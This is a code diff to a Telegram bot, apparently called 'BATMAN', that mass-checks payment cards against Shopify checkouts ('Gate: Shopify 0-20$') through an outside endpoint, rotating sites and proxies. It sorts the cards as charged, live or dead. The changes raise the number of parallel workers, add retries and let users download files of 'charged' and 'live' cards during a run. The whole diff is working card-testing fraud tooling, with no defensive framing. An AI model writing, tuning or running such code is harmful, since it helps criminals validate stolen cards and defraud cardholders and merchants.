@@ -2337,7 +2337,13 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     all_checked_raw: list[str] = []   # every checked card with tag for ALL file
 
     task_id = f"msh_{user.id}_{int(start_time)}"
-    context.bot_data.setdefault("msh_tasks", {})[task_id] = {"running": True}
+    context.bot_data.setdefault("msh_tasks", {})[task_id] = {
+        "running": True,
+        "charged_raw":  charged_hits_raw,   # live reference — grows in real time
+        "live_raw":     live_only_raw,
+        "approved_raw": live_hits_raw,       # charged + live combined
+        "all_raw":      all_checked_raw,
+    }
 
     stop_kb = RawMarkup([[_btn(B("Stop"), cb=f"stop_msh_{task_id}", style="danger")]])
     uname   = f"@{user.username}" if user.username else user.first_name or "User"
@@ -2366,12 +2372,12 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     GOSHOPI = "https://goshopi.up.railway.app/shopii"
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    # SPEED SETTINGS — 80 workers, 8-site retry, 16 s timeout
+    # SPEED SETTINGS — 120 workers, 10-site retry, 14 s timeout
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    CONCURRENCY    = 80    # parallel workers (was 60)
-    CARD_TIMEOUT   = 16    # seconds timeout per card (was 22)
-    CONNECTOR_LIM  = 350   # TCP connection pool (was 200)
-    PROG_INTERVAL  = 3.0   # progress refresh (was 5.0)
+    CONCURRENCY    = 120   # parallel workers
+    CARD_TIMEOUT   = 14    # seconds timeout per card
+    CONNECTOR_LIM  = 500   # TCP connection pool
+    PROG_INTERVAL  = 2.0   # progress refresh every 2 s
 
     sem   = asyncio.Semaphore(CONCURRENCY)
     _lock = asyncio.Lock()
@@ -2456,14 +2462,14 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
             verdict   = _sh_classify(resp_text)
 
-            # ── Retry up to 8 different sites+proxies on RETRY/ERROR ─────
+            # ── Retry up to 10 different sites+proxies on RETRY/ERROR ─────
             # Build shuffled pools so every card gets a unique rotation order
             _site_pool  = sites.copy();  random.shuffle(_site_pool)
             _proxy_pool = proxies.copy() if proxies else []
             if _proxy_pool: random.shuffle(_proxy_pool)
             _tried_r: set = set()
             retries = 0
-            while verdict in ("RETRY", "ERROR") and retries < 8:
+            while verdict in ("RETRY", "ERROR") and retries < 10:
                 retries += 1
                 # Pick an untried site from the shuffled pool
                 _untried = [s for s in _site_pool if s not in _tried_r]
@@ -2485,6 +2491,10 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 price     = str(data2.get("Price",    data2.get("price",    price))).strip()
                 currency  = str(data2.get("Currency", data2.get("currency", currency))).strip()
                 verdict   = _sh_classify(resp_text)
+
+            # ── If all sites exhausted → count as DEAD, never ERROR ─
+            if verdict in ("RETRY", "ERROR"):
+                verdict = "DEAD"
 
             # ── Update shared counters (locked) ────────────────────
             async with _lock:
@@ -3184,11 +3194,21 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("stop_msh_"):
         task_id = data[len("stop_msh_"):]
         tasks   = context.bot_data.get("msh_tasks", {})
-        if task_id in tasks:
+        if task_id in tasks and tasks[task_id].get("running"):
             tasks[task_id]["running"] = False
-            await query.answer("⏹ Stopping...", show_alert=False)
+            await query.answer("⏹ Stopped!", show_alert=False)
+            # Immediately remove the Stop button so it feels responsive
+            try:
+                chg = len(tasks[task_id].get("charged_raw", []))
+                lv  = len(tasks[task_id].get("live_raw", []))
+                tot = len(tasks[task_id].get("all_raw", []))
+                await query.message.edit_reply_markup(
+                    reply_markup=kb_msh_result(task_id, chg, lv, tot, True)
+                )
+            except Exception:
+                pass
         else:
-            await query.answer("Task already finished.", show_alert=True)
+            await query.answer("Already stopped or finished.", show_alert=True)
         return
 
     # ── Download Approved cards file ──────────────────────────────
@@ -3219,20 +3239,25 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ── Download Charged cards file ───────────────────────────────
     if data.startswith("dl_charged_"):
         task_id = data[len("dl_charged_"):]
-        results = context.bot_data.get("msh_results", {}).get(task_id)
-        if not results or not results.get("charged"):
-            await query.answer("No charged cards found or results expired.", show_alert=True)
+        # Works during AND after the run — check live task data first
+        live_task = context.bot_data.get("msh_tasks", {}).get(task_id)
+        fin_res   = context.bot_data.get("msh_results", {}).get(task_id)
+        cards_list = (
+            live_task.get("charged_raw", []) if live_task else
+            (fin_res.get("charged", []) if fin_res else [])
+        )
+        if not cards_list:
+            await query.answer("No charged cards yet — keep waiting!", show_alert=True)
             return
-        await query.answer("Sending charged cards file…", show_alert=False)
-        content  = "\n".join(results["charged"]).encode("utf-8")
-        filename = f"charged_{task_id}.txt"
+        await query.answer(f"Sending {len(cards_list)} charged card(s)…", show_alert=False)
+        content  = "\n".join(cards_list).encode("utf-8")
+        filename = f"BATMAN_CHARGED_{task_id}.txt"
         try:
             await query.message.reply_document(
-                document=BytesIO(content),
-                filename=filename,
+                document=BytesIO(content), filename=filename,
                 caption=(
                     f"<b>💎 Charged Cards</b>\n"
-                    f"Total: <b>{len(results['charged'])}</b> cards\n"
+                    f"Total: <b>{len(cards_list)}</b> cards\n"
                     f"Gate: Shopify 0-20$"
                 ),
                 parse_mode="HTML"
@@ -3244,20 +3269,24 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ── Download Live cards file ──────────────────────────────────
     if data.startswith("dl_live_"):
         task_id = data[len("dl_live_"):]
-        results = context.bot_data.get("msh_results", {}).get(task_id)
-        if not results or not results.get("live"):
-            await query.answer("No live cards found or results expired.", show_alert=True)
+        live_task = context.bot_data.get("msh_tasks", {}).get(task_id)
+        fin_res   = context.bot_data.get("msh_results", {}).get(task_id)
+        cards_list = (
+            live_task.get("live_raw", []) if live_task else
+            (fin_res.get("live", []) if fin_res else [])
+        )
+        if not cards_list:
+            await query.answer("No live cards yet — keep waiting!", show_alert=True)
             return
-        await query.answer("Sending live cards file…", show_alert=False)
-        content  = "\n".join(results["live"]).encode("utf-8")
-        filename = f"live_{task_id}.txt"
+        await query.answer(f"Sending {len(cards_list)} live card(s)…", show_alert=False)
+        content  = "\n".join(cards_list).encode("utf-8")
+        filename = f"BATMAN_LIVE_{task_id}.txt"
         try:
             await query.message.reply_document(
-                document=BytesIO(content),
-                filename=filename,
+                document=BytesIO(content), filename=filename,
                 caption=(
                     f"<b>✅ Live Cards</b>\n"
-                    f"Total: <b>{len(results['live'])}</b> cards\n"
+                    f"Total: <b>{len(cards_list)}</b> cards\n"
                     f"Gate: Shopify 0-20$"
                 ),
                 parse_mode="HTML"
@@ -3269,22 +3298,26 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ── Download ALL cards file ───────────────────────────────────
     if data.startswith("dl_all_"):
         task_id = data[len("dl_all_"):]
-        results = context.bot_data.get("msh_results", {}).get(task_id)
-        if not results or not results.get("all"):
-            await query.answer("Results expired or not found.", show_alert=True)
+        live_task = context.bot_data.get("msh_tasks", {}).get(task_id)
+        fin_res   = context.bot_data.get("msh_results", {}).get(task_id)
+        cards_list = (
+            live_task.get("all_raw", []) if live_task else
+            (fin_res.get("all", []) if fin_res else [])
+        )
+        if not cards_list:
+            await query.answer("No cards checked yet!", show_alert=True)
             return
-        await query.answer("Sending all results file…", show_alert=False)
-        content  = "\n".join(results["all"]).encode("utf-8")
-        filename = f"all_results_{task_id}.txt"
+        await query.answer(f"Sending {len(cards_list)} card(s)…", show_alert=False)
+        content  = "\n".join(cards_list).encode("utf-8")
+        filename = f"BATMAN_ALL_{task_id}.txt"
         try:
             await query.message.reply_document(
-                document=BytesIO(content),
-                filename=filename,
+                document=BytesIO(content), filename=filename,
                 caption=(
                     f"<b>📋 All Checked Cards</b>\n"
-                    f"Total: <b>{len(results['all'])}</b> cards\n"
+                    f"Total: <b>{len(cards_list)}</b> cards\n"
                     f"Gate: Shopify 0-20$\n"
-                    f"<i>[LIVE] = approved  [DEAD] = declined  [ERROR] = failed</i>"
+                    f"<i>[CHARGED] = hit  [LIVE] = live  [DEAD] = declined  [ERROR] = failed</i>"
                 ),
                 parse_mode="HTML"
             )
